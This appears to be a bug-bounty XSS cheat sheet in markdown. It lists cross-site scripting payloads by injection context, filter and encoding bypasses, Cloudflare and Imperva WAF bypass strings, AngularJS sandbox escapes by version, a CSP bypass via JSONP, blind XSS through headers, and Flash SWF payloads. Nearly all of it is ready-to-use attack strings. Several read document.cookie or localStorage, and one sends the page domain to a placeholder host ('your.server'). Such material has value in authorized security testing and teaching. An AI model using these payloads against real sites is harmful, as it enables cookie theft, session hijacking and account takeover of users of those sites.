# XSS Cheat Sheet (Basic)

## Introduction
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into websites. There is 3 types of XSS Attack:
- Reflected XSS

    Attack where the malicious script runs from another website through the web browser    
- Stored XSS
  
    Stored attacks are those where the injected script is permanently stored on the target servers
- DOM-Based XSS

    A type of XSS that has payloads found in the DOM rather than within the HTML code.

## Payloads
1. Basic payload
```html
<script>alert(1)</script>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

2. Add ' or " to escape the payload from value of an HTML tag
```html
"><script>alert(1)</script>
'><script>alert(1)</script> 
```

* Example source code
```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

* After input the payload
```html
<input id="keyword" type="text" name="q" value=""><script>alert(1)</script>
```

3. Add --> to escape the payload if input lands in HTML comments.
```html
--><script>alert(1)</script>
```

* Example source code
```html
<!-- REFLECTED_HERE --> 
```

* After input the payload
```html
<!-- --><script>alert(1)</script> -->
```

4. Add </tag> when the input inside or between opening/closing tags, tag can be ```<a>,<title>,<script>``` and any other HTML tags
    
```html
</tag><script>alert(1)</script>
"></tag><script>alert(1)</script>
```

* Example source code
```html
<a href="https://target.com/1?status=REFLECTED_HERE">1</a>
```

* After input the payload
```html
<a href="https://target.com/1?status="></a><script>alert(1)</script>">1</a>
```

5. Use when input inside an attribute’s value of an HTML tag but > is filtered
```html
" onmouseover=alert(1)
" autofocus onfocus=alert(1)
```

* Example source code
```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

* After input the payload
```html
<input id="keyword" type="text" name="q" value="" onmouseover=alert(1)">
```

6. Use </script> when input inside ```<script>``` tags
```html
</script><script>alert(1)</script>
```

* Example source code
```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* After input the payload
```html
<script>
    var sitekey = '</script><script>alert(1)</script>';
</script>
```

## **XSS Cheat Sheet (Advanced)**
7. Use when input lands in a script block, inside a string delimited value.
```html
'-alert(1)-'
'/alert(1)//
```

* Example source code
```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* After input the payload
```html
<script>
    var sitekey = ''-alert(1)-'';
</script>
```

8. Same like Number 7. But inside a string delimited value but quotes are escaped by a backslash.
```html
\'alert(1)//
```

* Example source code
```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* If we input payload '-alert(1)-' it will be like this
```html
<script>
    var sitekey = '\'-alert(1)-\'';
</script>
```
The quotes are escaped by a backslash so we need to bypass them

* After input the payload
```html
<script>
    var sitekey = '\\'alert(1)//';
</script>
```

9. Use when there’s multi reflection in the same line of JS code
```html
/alert(1)//\
/alert(1)}//\
```

* Example source code
```html
<script>
    var a = 'REFLECTED_HERE'; var b = 'REFLECTED_HERE';
</script>
```

* After input the payload
```html
<script>
    var a = '/alert(1)//\'; var b = '/alert(1)//\';
</script>
```

10. Use when input inside a string delimited value and inside a single logical block like function or conditional (if, else, etc).
```html
'}alert(1);{'
\'}alert(1);{// 
```

* Example source code
```html
<script>
    var greeting;
    var time = 1;
    if (time < 10) {
    test = 'REFLECTED_HERE';
  }
</script>
```

* After input the payload
```html
<script>
    var test;
    var time = 1;
    if (time < 10) {
    test = ''}alert(1);{'';
  }
</script>
```

> Payload number 2 uses when quote escaped by backslash

11. Use when input lands inside backticks delimited strings
```html
${alert(1)}
```

* Example source code
```html
<script>
    var dapos = `REFLECTED_HERE`;
</script>
```

* After input the payload
```html
<script>
    var dapos = `${alert(1)}`;
</script>
```

12. Uses when there is multiple reflections on same page. (Double Reflection)
```html
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
```

* After input the payload
```html
<!DOCTYPE html>
<html>
<body>
'onload=alert(1)><svg/1='
[...]
'onload=alert(1)><svg/1='
</body>
</html>
```

13. Uses when there is multiple reflections on same page. (Triple Reflection)
```html
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
```

* After input the payload
```html
<!DOCTYPE html>
<html>
<body>
*/alert(1)">'onload="/*<svg/1='
[...]
*/alert(1)">'onload="/*<svg/1='
[...]
*/alert(1)">'onload="/*<svg/1='
</body>
</html>
```

14. XSS in filename (File Upload) Use when uploaded filename is reflected somewhere in target page
```
"><svg onload=alert(1)>.jpeg
```

15. XSS in metadata (File Upload) Use when uploaded metada is reflected somewhere in target page (using exiftool)
```
$ exiftool -Artist='"><script>alert(1)</script>' dapos.jpeg
```

16. XSS with SVG file (File Upload)
```
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

17. XSS via markdown
```
[Click Me](javascript:alert('1'))
```

18. XSS in XML page
```
<a:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</a:script>
```
> Add a "-->" to payload if input lands in a comment section

> Add a "]]>" if input lands in a CDATA section

## **XSS Bypass**

1. Mixed Case
```html
<ScRiPt>AlErT(DoCuMeNt.CoOkIe)</ScRiPt> 
```

2. Unclosed Tags
```html
<svg onload="alert(1)"
```

3. Uppercase Payloads
```html
<SVG ONLOAD=ALERT(1)>
```

4. Encoded XSS
```html
(Encoded)
%3Csvg%20onload%3Dalert(1)%3E 

(Double Encoded)
%253Csvg%2520onload%253Dalert%281%29%253E 

(Triple Encoded)
%25253Csvg%252520onload%25253Dalert%25281%2529%25253E 
```

5. JS Lowercased Input
```html
<SCRİPT>alert(1)</SCRİPT>
```

6. PHP Email Validation Bypass
```html
<svg/onload=alert(1)>"@gmail.com
```

7. PHP URL Validation Bypass
```html
javascript://%250Aalert(1)
```

8. Inside Comments Bypass
```html
<!--><svg onload=alert(1)-->
```

9. Bypass WAF if html tag is deleted from source, for instance the tag <embed> was deleted from the source
```html
" on<embed>click="a=al<embed>ert,a(cookie)
```

10. Single string (')
```html
"><a/href="'j'a'v'a'sc'r'ip't':'alert(d'ocumen't.domain)"/>
```
11. Filter Bypass via unicode
```
%u003Csvg onload=alert(1)>
%u3008svg onload=alert(2)> 
%uFF1Csvg onload=alert(3)>
```
## JS Context

1. function Name() {document.location.href = "test.aspx?id="<PAYLOAD>";}
   - payload `";}alert(document.cookie);{//`

## Tips and Trick
   - '-[document.cookie].find(alert)-' >> converted to '-[document.cookie] everything is deleted after ] , I bypassed this with putting = before the payload
='-[document.cookie].find(alert)-'
   - XSS location.assign 
  ```html
  <svg onload=location.assign("javascript:alert`_Y000!_`");>
  ```
   - XSS lead to admintakeover
     ![POC](https://pbs.twimg.com/media/EUHdw3hXkAEO7ra?format=png&name=900x900)
   - A cuneiform payload by @lutfumertceylan
      ```html
      𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++], 𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀] +(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀] +𒀟]𒁹()
      ```
    
 ## Blind XSS
    
 Tools Used [XSS Hunter](https://xsshunter.com/features)
1. Inject Blind XSS Payload to User-Agent Header
2. Inject Blind XSS Payload to Referrer/Origin Header
3. Try using another trick and tips above if there have some protection 
4. Inject blind xss to the feature like (report, contant me, chat request,customer support,suggestion) where the admin or victim review it somewhere (backend)
    
## Bypass WAF
1. Cloudflare
```
<svg%0Aonauxclick=0;[1].some(confirm)//

<svg onload=alert%26%230000000040"")>

<a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(1)&rpar;>
<svg onx=() onload=(confirm)(1)>

<svg onx=() onload=(confirm)(document.cookie)>
    
<svg/onload=location/**/='https://your.server/'+document.domain>
    
<svg onx=() onload=(confirm)(JSON.stringify(localStorage))>

Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();

"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;

Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();

"><onx=[] onmouseover=prompt(1)>

%2sscript%2ualert()%2s/script%2u -xss popup

<svg onload=alert%26%230000000040"1")>

"Onx=() onMouSeoVer=prompt(1)>"Onx=[] onMouSeoVer=prompt(1)>"/*/Onx=""//onfocus=prompt(1)>"//Onx=""/*/%01onfocus=prompt(1)>"%01onClick=prompt(1)>"%2501onclick=prompt(1)>"onClick="(prompt)(1)"Onclick="(prompt(1))"OnCliCk="(prompt`1`)"Onclick="([1].map(confirm))

[1].map(confirm)'ale'+'rt'()a&Tab;l&Tab;e&Tab;r&Tab;t(1)prompt&lpar;1&rpar;prompt&#40;1&#41;prompt%26%2300000000000000000040;1%26%2300000000000000000041;(prompt())(prompt``)

<svg onload=prompt%26%230000000040document.domain)>

<svg onload=prompt%26%23x000000028;document.domain)>

<svg/onrandom=random onload=confirm(1)>

%2sscript%2ualert()%2s/script%2u
    
<video onnull=null onmouseover=confirm(1)>

<a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a><input autofocus>

:javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie

<img ignored=() src=x onerror=prompt(1)>
```
2. Imperva WAF bypass payload 
```
 <x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme

<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0]v+a+e+s(/infected/.source)" />click
 ```

## Random Payload
   - `<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>`
   - ?=”,?=!?+?,?=!?+?,?=?+{},?=?[?++],
?=?[?=?],?=++?+?,?=?[?+?],?[?+=?[?] +(?.?+?)[?]+?[?]+?+?+?[?]+?+?+?[?] +?][?](?[?]+?[?]+?[?]+?+?+”(?)”)()
   - 
## Markdown XSS

```md
[a](javascript:confirm(1))
```

```md
[a](javascript://www.google.com%0Aprompt(1))
```

```md
[a](javascript://%0d%0aconfirm(1))
```

```md
[a](javascript://%0d%0aconfirm(1);com)
```

```md
[a](javascript:window.onerror=confirm;throw%201)
```

```md
[a]: (javascript:prompt(1))
```

```md
[a]:(javascript:alert(1))           //Add SOH Character
```
     
## AngularJS Template Injection based XSS**

*For manual verification on a live target, use `angular.version` in your browser console*

**1.0.1 - 1.1.5** by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)

```js
{{constructor.constructor('alert(1)')()}}
```

**1.2.0 - 1.2.1** by [Jan Horn (Google)](https://twitter.com/tehjh)

```js
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

**1.2.2 - 1.2.5** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
```

**1.2.6 - 1.2.18** by [Jan Horn (Google)](https://twitter.com/tehjh)

```js
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

**1.2.19 - 1.2.23** by [Mathias Karlsson](https://twitter.com/avlidienbrunn)

```js
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

**1.2.24 - 1.2.29** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

**1.3.0** by [Gábor Molnár (Google)](https://twitter.com/molnar_g)

```
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
```

**1.3.1 - 1.3.2** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf; 
    $eval('x=alert(1)//'); 
}}
```

**1.3.3 - 1.3.18** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 

  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}
```

**1.3.19** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; 
    $eval('x=alert(1)//'); 
}}

```

**1.3.20** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

**1.4.0 - 1.4.9** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**1.5.0 - 1.5.8** by [Ian Hickey](https://twitter.com/ianhickey1024)

```js
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

**1.5.9 - 1.5.11** by [Jan Horn (Google)](https://twitter.com/tehjh)

```js
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

**1.6.0+** (no [Expression Sandbox](http://angularjs.blogspot.co.uk/2016/09/angular-16-expression-sandbox-removal.html)) by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)

```js
{{constructor.constructor('alert(1)')()}}
```
     
## Content Security Policy (CSP) bypass via JSONP endpoints**

Grab the target's CSP:

```
curl -I http://example.com | grep 'Content-Security-Policy'
```

Either paste the CSP into https://csp-evaluator.withgoogle.com/ or just submit the target's address into the "Content Security Policy" field. The CSP Evaluator will notify you if one of the whitelisted domains has JSONP endpoints.

![image](https://user-images.githubusercontent.com/18099289/32136707-a1c12510-bc12-11e7-8a80-8a22b3e94232.png)

Now we can use a Google dork to find some JSONP endpoints on the domains listed above.

```
site:example.com inurl:callback
```
     
## Flash SWF XSS

   - ZeroClipboard: `ZeroClipboard.swf?id=\"))}catch(e){confirm(/XSS./.source);}//&width=500&height=500&.swf`
   - plUpload Player: `plupload.flash.swf?%#target%g=alert&uid%g=XSS&`

   - plUpload MoxiePlayer: `Moxie.swf?target%g=confirm&uid%g=XSS` (also works with `Moxie.cdn.swf` and other variants)

   - FlashMediaElement: <code>flashmediaelement.swf?jsinitfunctio%gn=alert`1`</code>

   - videoJS: `video-js.swf?readyFunction=confirm` and `video-js.swf?readyFunction=alert%28document.domain%2b'%20XSS'%29`

   - YUI "io.swf": `io.swf?yid=\"));}catch(e){alert(document.domain);}//`

   - YUI "uploader.swf": `uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert%28document.domain%29;}//<`

   - Open Flash Chart: `open-flash-chart.swf?get-data=(function(){alert(1)})()`

   - AutoDemo: `control.swf?onend=javascript:alert(1)//`

   - Adobe FLV Progressive: `/main.swf?baseurl=asfunction:getURL,javascript:alert(1)//` and `/FLVPlayer_Progressive.swf?skinName=asfunction:getURL,javascript:alert(1)//`

   - Banner.swf (generic): `banner.swf?clickTAG=javascript:alert(document.domain);//`

   - JWPlayer (legacy): `player.swf?playerready=alert(document.domain)` and `/player.swf?tracecall=alert(document.domain)`

   - SWFUpload 2.2.0.1: `swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!confirm(1);//`

   - Uploadify (legacy): `uploadify.swf?movieName=%22])}catch(e){if(!window.x){window.x=1;confirm(%27XSS%27)}}//&.swf`

   - FlowPlayer 3.2.7: `flowplayer-3.2.7.swf?config={"clip":{"url":"http://edge.flowplayer.org/bauhaus.mp4","linkUrl":"JavaScriPt:confirm(document.domain)"}}&.swf`

_Note: Useful reference on constructing Flash-based XSS payloads available at [MWR Labs](https://labs.mwrinfosecurity.com/blog/popping-alert1-in-flash/)._

     
## Reference:
   - https://github.com/Auxirie/AllAboutBugBounty/blob/master/Cross%20Site%20Scripting.md
